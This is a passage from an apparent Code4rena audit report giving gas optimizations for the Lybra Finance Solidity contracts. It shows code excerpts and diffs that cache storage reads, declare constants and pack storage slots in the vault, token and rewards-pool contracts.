https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L189-L202

### Cache `totalDepositedAsset` and `depositedAsset[onBehalfOf]` to save 3 SLOADs
```solidity
File: contracts/lybra/pools/base/LybraEUSDVaultBase.sol
189:        require((totalDepositedAsset * assetPrice * 100) / poolTotalEUSDCirculation < badCollateralRatio, "overallCollateralRatio should below 150%"); // @audit: 1st sload
190:        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf]; // @audit: 1st sload
191:        require(onBehalfOfCollateralRatio < 125 * 1e18, "borrowers collateralRatio should below 125%");
192:        require(assetAmount <= depositedAsset[onBehalfOf], "total of collateral can be liquidated at most"); // @audit: 2nd sload
193:        uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;
194:        if (onBehalfOfCollateralRatio >= 1e20) {
195:            eusdAmount = (eusdAmount * 1e20) / onBehalfOfCollateralRatio;
196:        }
197:        require(EUSD.allowance(provider, address(this)) >= eusdAmount, "provider should authorize to provide liquidation EUSD");
198:
199:        _repay(provider, onBehalfOf, eusdAmount);
200:
201:        totalDepositedAsset -= assetAmount; // @audit: 2nd sload
202:        depositedAsset[onBehalfOf] -= assetAmount; // @audit: 3rd sload
```
```diff
diff --git a/lybra/pools/base/LybraEUSDVaultBase.sol b/lybra/pools/base/LybraEUSDVaultBase.sol
index 7a8c439..36ffa6a 100644
--- a/lybra/pools/base/LybraEUSDVaultBase.sol
+++ b/lybra/pools/base/LybraEUSDVaultBase.sol
@@ -186,10 +186,12 @@ abstract contract LybraEUSDVaultBase {
      */
     function superLiquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {
         uint256 assetPrice = getAssetPrice();
-        require((totalDepositedAsset * assetPrice * 100) / poolTotalEUSDCirculation < badCollateralRatio, "overallCollateralRatio should below 150%");
-        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf];
+        uint256 _totalDepositedAsset = totalDepositedAsset;
+        require((_totalDepositedAsset * assetPrice * 100) / poolTotalEUSDCirculation < badCollateralRatio, "overallCollateralRatio should below 150%");
+        uint256 _depositedAsset = depositedAsset[onBehalfOf];
+        uint256 onBehalfOfCollateralRatio = (_depositedAsset * assetPrice * 100) / borrowed[onBehalfOf];
         require(onBehalfOfCollateralRatio < 125 * 1e18, "borrowers collateralRatio should below 125%");
-        require(assetAmount <= depositedAsset[onBehalfOf], "total of collateral can be liquidated at most");
+        require(assetAmount <= _depositedAsset, "total of collateral can be liquidated at most");
         uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;
         if (onBehalfOfCollateralRatio >= 1e20) {
             eusdAmount = (eusdAmount * 1e20) / onBehalfOfCollateralRatio;
@@ -198,8 +200,8 @@ abstract contract LybraEUSDVaultBase {

         _repay(provider, onBehalfOf, eusdAmount);

-        totalDepositedAsset -= assetAmount;
-        depositedAsset[onBehalfOf] -= assetAmount;
+        totalDepositedAsset = _totalDepositedAsset - assetAmount;
+        depositedAsset[onBehalfOf] = _depositedAsset -  assetAmount;
         uint256 reward2keeper;
         if (msg.sender != provider && onBehalfOfCollateralRatio >= 1e20 + configurator.vaultKeeperRatio(address(this)) * 1e18) {
             reward2keeper = ((assetAmount * configurator.vaultKeeperRatio(address(this))) * 1e18) / onBehalfOfCollateralRatio;
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L156-L166

### Cache `depositedAsset[onBehalfOf]` to save 2 SLOADs
```solidity
File: contracts/lybra/pools/base/LybraEUSDVaultBase.sol
156:        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf]; // @audit: 1st sload
157:        require(onBehalfOfCollateralRatio < badCollateralRatio, "Borrowers collateral ratio should below badCollateralRatio");
158:
159:        require(assetAmount * 2 <= depositedAsset[onBehalfOf], "a max of 50% collateral can be liquidated"); // @audit: 2nd sload
160:        require(EUSD.allowance(provider, address(this)) > 0, "provider should authorize to provide liquidation EUSD");
161:        uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;
162:
163:        _repay(provider, onBehalfOf, eusdAmount);
164:        uint256 reducedAsset = (assetAmount * 11) / 10;
165:        totalDepositedAsset -= reducedAsset;
166:        depositedAsset[onBehalfOf] -= reducedAsset; // @audit: 3rd sload
```
```diff
diff --git a/lybra/pools/base/LybraEUSDVaultBase.sol b/lybra/pools/base/LybraEUSDVaultBase.sol
index 7a8c439..f3fd55b 100644
--- a/lybra/pools/base/LybraEUSDVaultBase.sol
+++ b/lybra/pools/base/LybraEUSDVaultBase.sol
@@ -153,17 +153,18 @@ abstract contract LybraEUSDVaultBase {
      */
     function liquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {
         uint256 assetPrice = getAssetPrice();
-        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf];
+        uint256 _depositedAsset = depositedAsset[onBehalfOf];
+        uint256 onBehalfOfCollateralRatio = (_depositedAsset * assetPrice * 100) / borrowed[onBehalfOf];
         require(onBehalfOfCollateralRatio < badCollateralRatio, "Borrowers collateral ratio should below badCollateralRatio");

-        require(assetAmount * 2 <= depositedAsset[onBehalfOf], "a max of 50% collateral can be liquidated");
+        require(assetAmount * 2 <= _depositedAsset, "a max of 50% collateral can be liquidated");
         require(EUSD.allowance(provider, address(this)) > 0, "provider should authorize to provide liquidation EUSD");
         uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;

         _repay(provider, onBehalfOf, eusdAmount);
         uint256 reducedAsset = (assetAmount * 11) / 10;
         totalDepositedAsset -= reducedAsset;
-        depositedAsset[onBehalfOf] -= reducedAsset;
+        depositedAsset[onBehalfOf] = _depositedAsset - reducedAsset;
         uint256 reward2keeper;
         if (provider == msg.sender) {
             collateralAsset.transfer(msg.sender, reducedAsset);
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L101-L103

### Cache `depositedAsset[msg.sender]` to save 1 SLOAD
```solidity
File: contracts/lybra/pools/base/LybraEUSDVaultBase.sol
101:        require(depositedAsset[msg.sender] >= amount, "Withdraw amount exceeds deposited amount."); // @audit: 1st sload
102:        totalDepositedAsset -= amount;
103:        depositedAsset[msg.sender] -= amount; // @audit: 2nd sload
```
```diff
diff --git a/lybra/pools/base/LybraEUSDVaultBase.sol b/lybra/pools/base/LybraEUSDVaultBase.sol
index 7a8c439..6a84bd2 100644
--- a/lybra/pools/base/LybraEUSDVaultBase.sol
+++ b/lybra/pools/base/LybraEUSDVaultBase.sol
@@ -98,9 +98,10 @@ abstract contract LybraEUSDVaultBase {
     function withdraw(address onBehalfOf, uint256 amount) external virtual {
         require(onBehalfOf != address(0), "TZA");
         require(amount > 0, "ZERO_WITHDRAW");
-        require(depositedAsset[msg.sender] >= amount, "Withdraw amount exceeds deposited amount.");
+        uint256 _depositedAsset = depositedAsset[msg.sender];
+        require(_depositedAsset >= amount, "Withdraw amount exceeds deposited amount.");
         totalDepositedAsset -= amount;
-        depositedAsset[msg.sender] -= amount;
+        depositedAsset[msg.sender] = _depositedAsset - amount;

         uint256 withdrawal = checkWithdrawal(msg.sender, amount);
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L72-L78

### Cache return value from `rewardPerToken()` to save 1 SLOAD
```solidity
File: contracts/lybra/miner/EUSDMiningIncentives.sol
72:    modifier updateReward(address _account) {
73:        rewardPerTokenStored = rewardPerToken();
74:        updatedAt = lastTimeRewardApplicable();
75:
76:        if (_account != address(0)) {
77:            rewards[_account] = earned(_account);
78:            userRewardPerTokenPaid[_account] = rewardPerTokenStored;
```
```diff
diff --git a/lybra/miner/EUSDMiningIncentives.sol b/lybra/miner/EUSDMiningIncentives.sol
index e6c57c8..e58dc2d 100644
--- a/lybra/miner/EUSDMiningIncentives.sol
+++ b/lybra/miner/EUSDMiningIncentives.sol
@@ -70,12 +70,13 @@ contract EUSDMiningIncentives is Ownable {
     }

     modifier updateReward(address _account) {
-        rewardPerTokenStored = rewardPerToken();
+        uint256 _rewardPerTokenStored = rewardPerToken();
+        rewardPerTokenStored = _rewardPerTokenStored;
         updatedAt = lastTimeRewardApplicable();

         if (_account != address(0)) {
             rewards[_account] = earned(_account);
-            userRewardPerTokenPaid[_account] = rewardPerTokenStored;
+            userRewardPerTokenPaid[_account] = _rewardPerTokenStored;
             userUpdatedAt[_account] = block.timestamp;
         }
         _;
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/EUSD.sol#L311-L317

### Cache `_totalShares` to save 1 SLOAD

*Note: This `view` function is invoked within state-mutating functions*
```solidity
File: contracts/lybra/token/EUSD.sol
311:    function getMintedEUSDByShares(uint256 _sharesAmount) public view returns (uint256) {
312:        if (_totalShares == 0) { // @audit: 1st sload
313:            return 0;
314:        } else {
315:            return _sharesAmount.mul(_totalSupply).div(_totalShares); // @audit: 2nd sload
316:        }
317:    }
```
```diff
diff --git a/lybra/token/EUSD.sol b/lybra/token/EUSD.sol
index cca5cee..2b5a822 100644
--- a/lybra/token/EUSD.sol
+++ b/lybra/token/EUSD.sol
@@ -309,10 +309,11 @@ contract EUSD is IERC20, Context {
      * @return the amount of EUSD that corresponds to `_sharesAmount` token shares.
      */
     function getMintedEUSDByShares(uint256 _sharesAmount) public view returns (uint256) {
-        if (_totalShares == 0) {
+        uint256 _cachedTotalShares = _totalShares;
+        if (_cachedTotalShares == 0) {
             return 0;
         } else {
-            return _sharesAmount.mul(_totalSupply).div(_totalShares);
+            return _sharesAmount.mul(_totalSupply).div(_cachedTotalShares);
         }
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L155-L159

### Cache `time2fullRedemption[user]` and `lastWithdrawTime[user]` to save 2 SLOADs

*Note: This `view` function is invoked within state-mutating functions:*
```solidity
File: contracts/lybra/miner/ProtocolRewardsPool.sol
155:    function getClaimAbleLBR(address user) public view returns (uint256 amount) {
156:        if (time2fullRedemption[user] > lastWithdrawTime[user]) { // @audit: 1st sloads
157:            amount = block.timestamp > time2fullRedemption[user] ? unstakeRatio[user] * (time2fullRedemption[user] - lastWithdrawTime[user]) : unstakeRatio[user] * (block.timestamp - lastWithdrawTime[user]); // @audit: 2nd sloads
158:        }
159:    }
```
```diff
diff --git a/lybra/miner/ProtocolRewardsPool.sol b/lybra/miner/ProtocolRewardsPool.sol
index 8fc83d6..363c9e2 100644
--- a/lybra/miner/ProtocolRewardsPool.sol
+++ b/lybra/miner/ProtocolRewardsPool.sol
@@ -153,8 +153,10 @@ contract ProtocolRewardsPool is Ownable {
     }

     function getClaimAbleLBR(address user) public view returns (uint256 amount) {
-        if (time2fullRedemption[user] > lastWithdrawTime[user]) {
-            amount = block.timestamp > time2fullRedemption[user] ? unstakeRatio[user] * (time2fullRedemption[user] - lastWithdrawTime[user]) : unstakeRatio[user] * (block.timestamp - lastWithdrawTime[user]);
+        uint256 _time2fullRedemption = time2fullRedemption[user];
+        uint256 _lastWithdrawTime = lastWithdrawTime[user];
+        if (_time2fullRedemption > _lastWithdrawTime) {
+            amount = block.timestamp > _time2fullRedemption ? unstakeRatio[user] * (_time2fullRedemption - _lastWithdrawTime) : unstakeRatio[user] * (block.timestamp - _lastWithdrawTime);
         }
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L92-L94

### Cache `time2fullRedemption[msg.sender]` to save 1 SLOAD
```solidity
File: contracts/lybra/miner/ProtocolRewardsPool.sol
92:        if (time2fullRedemption[msg.sender] > block.timestamp) { // @audit: 1st sload
93:            total += unstakeRatio[msg.sender] * (time2fullRedemption[msg.sender] - block.timestamp); // @audit: 2nd sload
94:        }
```
```diff
diff --git a/lybra/miner/ProtocolRewardsPool.sol b/lybra/miner/ProtocolRewardsPool.sol
index 8fc83d6..de2ecf4 100644
--- a/lybra/miner/ProtocolRewardsPool.sol
+++ b/lybra/miner/ProtocolRewardsPool.sol
@@ -89,8 +89,9 @@ contract ProtocolRewardsPool is Ownable {
         esLBR.burn(msg.sender, amount);
         withdraw(msg.sender);
         uint256 total = amount;
-        if (time2fullRedemption[msg.sender] > block.timestamp) {
-            total += unstakeRatio[msg.sender] * (time2fullRedemption[msg.sender] - block.timestamp);
+        uint256 _time2fullRedemption = time2fullRedemption[msg.sender];
+        if (_time2fullRedemption > block.timestamp) {
+            total += unstakeRatio[msg.sender] * (_time2fullRedemption - block.timestamp);
         }
         unstakeRatio[msg.sender] = total / exitCycle;
         time2fullRedemption[msg.sender] = block.timestamp + exitCycle;
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/PeUSDMainnetStableVision.sol#L117-L119

### Cache `userConvertInfo[msg.sender].depositedEUSDShares` and `userConvertInfo[msg.sender].mintedPeUSD` to save 2 SLOADs
```solidity
File: contracts/lybra/token/PeUSDMainnetStableVision.sol
117:        uint256 share = (userConvertInfo[msg.sender].depositedEUSDShares * peusdAmount) / userConvertInfo[msg.sender].mintedPeUSD;
118:        userConvertInfo[msg.sender].mintedPeUSD -= peusdAmount;
119:        userConvertInfo[msg.sender].depositedEUSDShares -= share;
```
```diff 
diff --git a/lybra/token/PeUSDMainnetStableVision.sol b/lybra/token/PeUSDMainnetStableVision.sol
index a1b2c72..a8f5db2 100644
--- a/lybra/token/PeUSDMainnetStableVision.sol
+++ b/lybra/token/PeUSDMainnetStableVision.sol
@@ -114,9 +114,11 @@ contract PeUSDMainnet is BaseOFTV2, ERC20 {
     function convertToEUSD(uint256 peusdAmount) external {
         require(peusdAmount <= userConvertInfo[msg.sender].mintedPeUSD &&peusdAmount > 0, "PCE");
         _burn(msg.sender, peusdAmount);
-        uint256 share = (userConvertInfo[msg.sender].depositedEUSDShares * peusdAmount) / userConvertInfo[msg.sender].mintedPeUSD;
-        userConvertInfo[msg.sender].mintedPeUSD -= peusdAmount;
-        userConvertInfo[msg.sender].depositedEUSDShares -= share;
+        uint256 _depositedEUSDShares = userConvertInfo[msg.sender].depositedEUSDShares;
+        uint256 _mintedPeUSD = userConvertInfo[msg.sender].mintedPeUSD;
+        uint256 share = (_depositedEUSDShares * peusdAmount) / _mintedPeUSD;
+        userConvertInfo[msg.sender].mintedPeUSD = _mintedPeUSD - peusdAmount;
+        userConvertInfo[msg.sender].depositedEUSDShares = _depositedEUSDShares - share;
         EUSD.transferShares(msg.sender, share);
     }
```

</details>

## [G-02] State variables only set during construction should be declared constant
The solidity compiler will directly embed the values of constant variables into your contract bytecode, and therefore, will save you from incurring a `Gsset (20000 gas)` when you set storage variables during construction; a `Gcoldsload (2100 gas)` when you access storage variables for the first time in a transaction, and a `Gwarmaccess (100 gas)` for each subsequent access to that storage slot.

Total Instances: `2`

Estimated Gas Saved: `2 * 2100 = 4200`

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/LBR.sol#L15

```solidity
File: contracts/lybra/token/LBR.sol
15:    uint256 maxSupply = 100_000_000 * 1e18; // @audit: only set during construction
```
```diff
diff --git a/lybra/token/LBR.sol b/lybra/token/LBR.sol
index 26fe9d0..a2a802f 100644
--- a/lybra/token/LBR.sol
+++ b/lybra/token/LBR.sol
@@ -12,7 +12,7 @@ import "../../OFT/BaseOFTV2.sol";

 contract LBR is BaseOFTV2, ERC20 {
     Iconfigurator public immutable configurator;
-    uint256 maxSupply = 100_000_000 * 1e18;
+    uint256 constant maxSupply = 100_000_000 * 1e18;
     uint internal immutable ld2sdRatio;
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/esLBR.sol#L20

```solidity
File: contracts/lybra/token/esLBR.sol
20:    uint256 maxSupply = 100_000_000 * 1e18; // @audit: only set during construction
```
```diff
diff --git a/lybra/token/esLBR.sol b/lybra/token/esLBR.sol 
index ca08201..da5d08d 100644
--- a/lybra/token/esLBR.sol 
+++ b/lybra/token/esLBR.sol 
@@ -17,7 +17,7 @@ interface IProtocolRewardsPool {
 contract esLBR is ERC20Votes {
     Iconfigurator public immutable configurator;

-    uint256 maxSupply = 100_000_000 * 1e18;
+    uint256 constant maxSupply = 100_000_000 * 1e18;

     constructor(address _config) ERC20Permit("esLBR") ERC20("esLBR", "esLBR") {
         configurator = Iconfigurator(_config);
```

## [G-03] State variables can be packed into fewer storage slots
The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to eachother in storage and this will pack the values together into a single 32 byte storage slot (if the values combined are <= 32 bytes). If the variables packed together are retrieved together in functions, we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a `Gwarmaccess (100 gas)` versus a `Gcoldsload (2100 gas)`.

Total Instances: `5`

Estimated Gas Saved: `11 (slots) * 2000 = 22000`

<details>

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L38-L57

### Pack `finishAt`, `updatedAt`, `extraRatio`, `preUSDExtraRatio`, `biddingFeeRatio`, and `isEUSDBuyoutAllowed` into one storage slot to save 4 SLOTs (~8000 gas)

*Note: `finishAt` and `updatedAt` hold timestamps, and therefore, a `unit` type of `uint40` should be big enough to hold those values. `extraRatio`, `preUSDExtraRatio`, and `biddingFeeRatio` are all enforced to have a max upper bounds and can be reduced to a lower `uint` type that can hold those max values (see Diff below).*
```solidity
File: contracts/lybra/miner/EUSDMiningIncentives.sol
38:    uint256 public finishAt;
39:    // Minimum of last updated time and reward finish time
40:    uint256 public updatedAt;
41:    // Reward to be paid out per second
42:    uint256 public rewardRatio;
43:    // Sum of (reward ratio * dt * 1e18 / total supply)
44:    uint256 public rewardPerTokenStored;
45:    // User address => rewardPerTokenStored
46:    mapping(address => uint256) public userRewardPerTokenPaid;
47:    // User address => rewards to be claimed
48:    mapping(address => uint256) public rewards;
49:    mapping(address => uint256) public userUpdatedAt;
50:    uint256 public extraRatio = 50 * 1e18;
51:    uint256 public peUSDExtraRatio = 10 * 1e18;
52:    uint256 public biddingFeeRatio = 3000;
53:    address public ethlbrStakePool;
54:    address public ethlbrLpToken;
55:    AggregatorV3Interface internal etherPriceFeed;
56:    AggregatorV3Interface internal lbrPriceFeed;
57:    bool public isEUSDBuyoutAllowed = true;
```
```diff
diff --git a/lybra/miner/EUSDMiningIncentives.sol b/lybra/miner/EUSDMiningIncentives.sol
index e6c57c8..173fc87 100644
--- a/lybra/miner/EUSDMiningIncentives.sol
+++ b/lybra/miner/EUSDMiningIncentives.sol
@@ -34,26 +34,26 @@ contract EUSDMiningIncentives is Ownable {

     // Duration of rewards to be paid out (in seconds)
     uint256 public duration = 2_592_000;
-    // Timestamp of when the rewards finish
-    uint256 public finishAt;
-    // Minimum of last updated time and reward finish time
-    uint256 public updatedAt;
     // Reward to be paid out per second
     uint256 public rewardRatio;
     // Sum of (reward ratio * dt * 1e18 / total supply)
     uint256 public rewardPerTokenStored;
+    address public ethlbrStakePool;
+    address public ethlbrLpToken;
+    AggregatorV3Interface internal etherPriceFeed;
+    AggregatorV3Interface internal lbrPriceFeed;
     // User address => rewardPerTokenStored
     mapping(address => uint256) public userRewardPerTokenPaid;
     // User address => rewards to be claimed
     mapping(address => uint256) public rewards;
     mapping(address => uint256) public userUpdatedAt;
-    uint256 public extraRatio = 50 * 1e18;
-    uint256 public peUSDExtraRatio = 10 * 1e18;
-    uint256 public biddingFeeRatio = 3000;
-    address public ethlbrStakePool;
-    address public ethlbrLpToken;
-    AggregatorV3Interface internal etherPriceFeed;
-    AggregatorV3Interface internal lbrPriceFeed;
+    uint72 public extraRatio = 50 * 1e18;
+    uint72 public peUSDExtraRatio = 10 * 1e18;
+    uint16 public biddingFeeRatio = 3000;
+    // Timestamp of when the rewards finish
+    uint40 public finishAt;
+    // Minimum of last updated time and reward finish time
+    uint40 public updatedAt;
     bool public isEUSDBuyoutAllowed = true;

     event ClaimReward(address indexed user, uint256 amount, uint256 time);
@@ -71,7 +71,7 @@ contract EUSDMiningIncentives is Ownable {

     modifier updateReward(address _account) {
         rewardPerTokenStored = rewardPerToken();
-        updatedAt = lastTimeRewardApplicable();
+        updatedAt = uint40(lastTimeRewardApplicable());

         if (_account != address(0)) {
             rewards[_account] = earned(_account);
@@ -99,17 +99,17 @@ contract EUSDMiningIncentives is Ownable {

     function setBiddingCost(uint256 _biddingRatio) external onlyOwner {
         require(_biddingRatio <= 8000, "BCE");
-        biddingFeeRatio = _biddingRatio;
+        biddingFeeRatio = uint16(_biddingRatio);
     }

     function setExtraRatio(uint256 ratio) external onlyOwner {
         require(ratio <= 1e20, "BCE");
-        extraRatio = ratio;
+        extraRatio = uint72(ratio);
     }

     function setPeUSDExtraRatio(uint256 ratio) external onlyOwner {
         require(ratio <= 1e20, "BCE");
-        peUSDExtraRatio = ratio;
+        peUSDExtraRatio = uint72(ratio);
     }

     function setBoost(address _boost) external onlyOwner {
@@ -236,8 +236,8 @@ contract EUSDMiningIncentives is Ownable {

         require(rewardRatio > 0, "reward ratio = 0");

-        finishAt = block.timestamp + duration;
-        updatedAt = block.timestamp;
+        finishAt = uint40(block.timestamp + duration);
+        updatedAt = uint40(block.timestamp);
         emit NotifyRewardChanged(amount, block.timestamp);
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/configuration/LybraConfigurator.sol#L49-L61

### Pack `redemptionFee`, `flashLoanFee`, `maxStableRatio`, `curvePool`, and `premiumTradingEnabled` into one storage slot to save 3 SLOTs (~6000 gas)

*Note: `redemptionFee`, `flashLoanFee`, and `maxStableRatio` are all enforced to have a max upper bounds and can each fit into a type `uint16`.*
```solidity
File: contracts/lybra/configuration/LybraConfigurator.sol
49:    uint256 public redemptionFee = 50;
50:    IGovernanceTimelock public GovernanceTimelock;
51:
52:    IeUSDMiningIncentives public eUSDMiningIncentives;
53:    IProtocolRewardsPool public lybraProtocolRewardsPool;
54:    IEUSD public EUSD;
55:    IEUSD public peUSD;
56:    uint256 public flashloanFee = 500;
57:    // Limiting the maximum percentage of eUSD that can be cross-chain transferred to L2 in relation to the total supply.
58:    uint256 maxStableRatio = 5_000;
59:    address public stableToken;
60:    ICurvePool public curvePool;
61:    bool public premiumTradingEnabled;
```
```diff
diff --git a/lybra/configuration/LybraConfigurator.sol b/lybra/configuration/LybraConfigurator.sol
index c36e452..1cdc773 100644
--- a/lybra/configuration/LybraConfigurator.sol
+++ b/lybra/configuration/LybraConfigurator.sol
@@ -46,18 +46,18 @@ contract Configurator {
     mapping(address => bool) redemptionProvider;
     mapping(address => bool) public tokenMiner;

-    uint256 public redemptionFee = 50;
     IGovernanceTimelock public GovernanceTimelock;

     IeUSDMiningIncentives public eUSDMiningIncentives;
     IProtocolRewardsPool public lybraProtocolRewardsPool;
     IEUSD public EUSD;
     IEUSD public peUSD;
-    uint256 public flashloanFee = 500;
     // Limiting the maximum percentage of eUSD that can be cross-chain transferred to L2 in relation to the total supply.
-    uint256 maxStableRatio = 5_000;
     address public stableToken;
     ICurvePool public curvePool;
+    uint16 public redemptionFee = 50;
+    uint16 public flashloanFee = 500;
+    uint16 maxStableRatio = 5_000;
     bool public premiumTradingEnabled;

     event RedemptionFeeChanged(uint256 newSlippage);
@@ -185,7 +185,7 @@ contract Configurator {
      */
     function setRedemptionFee(uint256 newFee) external checkRole(TIMELOCK) {
         require(newFee <= 500, "Max Redemption Fee is 5%");
-        redemptionFee = newFee;
+        redemptionFee = uint16(newFee);
         emit RedemptionFeeChanged(newFee);
     }

@@ -245,7 +245,7 @@ contract Configurator {
      */
     function setMaxStableRatio(uint256 _ratio) external checkRole(TIMELOCK) {
         require(_ratio <= 10_000, "The maximum value is 10000");
-        maxStableRatio = _ratio;
+        maxStableRatio = uint16(_ratio);
     }

     /// @notice Update the flashloan fee percentage, only available to the manager of the contract
@@ -253,7 +253,7 @@ contract Configurator {
     function setFlashloanFee(uint256 fee) external checkRole(TIMELOCK) {
         if (fee > 10_000) revert('EL');
         emit FlashloanFeeUpdated(fee);
-        flashloanFee = fee;
+        flashloanFee = uint16(fee);
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L27-L41

### Pack `LBR` and `grabFeeRatio` into one storage slot to save 1 SLOT (~2000 gas)

*Note: `grabFeeRatio` has a max upper bound, and therefore, its `uint` size can be reduced to a lower size so that it can be packed with an address (160 bits).*
```solidity
File: contracts/lybra/miner/ProtocolRewardsPool.sol
27:    IesLBR public LBR;
28:    IesLBRBoost public esLBRBoost;
29:
30:    // Sum of (reward ratio * dt * 1e18 / total supply)
31:    uint public rewardPerTokenStored;
32:    // User address => rewardPerTokenStored
33:    mapping(address => uint) public userRewardPerTokenPaid;
34:    // User address => rewards to be claimed
35:    mapping(address => uint) public rewards;
36:    mapping(address => uint) public time2fullRedemption;
37:    mapping(address => uint) public unstakeRatio;
38:    mapping(address => uint) public lastWithdrawTime;
39:    uint256 immutable exitCycle = 90 days;
40:    uint256 public grabableAmount;
41:    uint256 public grabFeeRatio = 3000;
```
```diff
diff --git a/lybra/miner/ProtocolRewardsPool.sol b/lybra/miner/ProtocolRewardsPool.sol
index 8fc83d6..738d7cd 100644
--- a/lybra/miner/ProtocolRewardsPool.sol
+++ b/lybra/miner/ProtocolRewardsPool.sol
@@ -25,6 +25,7 @@ contract ProtocolRewardsPool is Ownable {
     Iconfigurator public immutable configurator;
     IesLBR public esLBR;
     IesLBR public LBR;
+    uint16 public grabFeeRatio = 3000;
     IesLBRBoost public esLBRBoost;

     // Sum of (reward ratio * dt * 1e18 / total supply)
@@ -38,7 +39,6 @@ contract ProtocolRewardsPool is Ownable {
     mapping(address => uint) public lastWithdrawTime;
     uint256 immutable exitCycle = 90 days;
     uint256 public grabableAmount;
-    uint256 public grabFeeRatio = 3000;
     event Restake(address indexed user, uint256 amount, uint256 time);
     event StakeLBR(address indexed user, uint256 amount, uint256 time);
     event UnstakeLBR(address indexed user, uint256 amount, uint256 time);
@@ -57,7 +57,7 @@ contract ProtocolRewardsPool is Ownable {

     function setGrabCost(uint256 _ratio) external onlyOwner {
         require(_ratio <= 8000, "BCE");
-        grabFeeRatio = _ratio;
+        grabFeeRatio = uint16(_ratio);
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/stakerewardV2pool.sol#L20-L27

### Pack `esLBRBoost`, `finishAt`, and `updatedAt` into one storage slot to save 2 SLOTs (~4000 gas)

*Note: The `uint` type for `finishAt` and `updatedAt` can be reduced since these variables hold timestamps.*
```solidity
File: contracts/lybra/miner/stakerewardV2Pool.sol
20:    IesLBRBoost public esLBRBoost;
21:
22:
23:    // Duration of rewards to be paid out (in seconds)
24:    uint256 public duration = 2_592_000;
25:    // Timestamp of when the rewards finish
26:    uint256 public finishAt;
27:    // Minimum of last updated time and reward finish time
28:    uint256 public updatedAt;
```
```diff
diff --git a/lybra/miner/stakerewardV2pool.sol b/lybra/miner/stakerewardV2pool.sol
index 4c264dc..88b02e2 100644
--- a/lybra/miner/stakerewardV2pool.sol
+++ b/lybra/miner/stakerewardV2pool.sol
@@ -18,13 +18,13 @@ contract StakingRewardsV2 is Ownable {
     IERC20 public immutable stakingToken;
     IesLBR public immutable rewardsToken;
     IesLBRBoost public esLBRBoost;
+    // Timestamp of when the rewards finish
+    uint48 public finishAt;
+    // Minimum of last updated time and reward finish time
+    uint48 public updatedAt;

     // Duration of rewards to be paid out (in seconds)
     uint256 public duration = 2_592_000;
-    // Timestamp of when the rewards finish
-    uint256 public finishAt;
-    // Minimum of last updated time and reward finish time
-    uint256 public updatedAt;
     // Reward to be paid out per second
     uint256 public rewardRatio;
     // Sum of (reward ratio * dt * 1e18 / total supply)
@@ -55,7 +55,7 @@ contract StakingRewardsV2 is Ownable {
     // Update user's claimable reward data and record the timestamp.
     modifier updateReward(address _account) {
         rewardPerTokenStored = rewardPerToken();
-        updatedAt = lastTimeRewardApplicable();
+        updatedAt = uint48(lastTimeRewardApplicable());

         if (_account != address(0)) {
             rewards[_account] = earned(_account);
@@ -139,8 +139,8 @@ contract StakingRewardsV2 is Ownable {

         require(rewardRatio > 0, "reward ratio = 0");

-        finishAt = block.timestamp + duration;
-        updatedAt = block.timestamp;
+        finishAt = uint48(block.timestamp + duration);
+        updatedAt = uint48(block.timestamp);
         emit NotifyRewardChanged(_amount, block.timestamp);
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/LybraStETHVault.sol#L14

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L25

*Note: This can only be done by rearranging so that the inherited storage slot is correct.*

### Reduce `uint` types for `lidoRebaseTime` and `lastReportTime` and pack into a single storage slot to save 1 SLOT (~2000 gas)

*Note: `LybraStEthVault` inherits from `LybraEUSDVaultBase` and therefore we can reduce the `uint` types for the above variables and reorganize the storage layout in `LybraEUSDVaultBase` in order to pack the variables together into one slot.*
```solidity
File: contracts/lybra/pools/LybraStETHVault.sol
14:    uint256 public lidoRebaseTime = 12 hours;
```
```solidity
File: contracts/lybra/pools/base/LybraEUSDVaultBase.sol
25:    uint256 public lastReportTime;
```
```diff
diff --git a/lybra/pools/LybraStETHVault.sol b/lybra/pools/LybraStETHVault.sol
index 3f20843..863fa57 100644
--- a/lybra/pools/LybraStETHVault.sol
+++ b/lybra/pools/LybraStETHVault.sol
@@ -11,7 +11,7 @@ interface Ilido {

 contract LybraStETHDepositVault is LybraEUSDVaultBase {
     // Currently, the official rebase time for Lido is between 12PM to 13PM UTC.
-    uint256 public lidoRebaseTime = 12 hours;
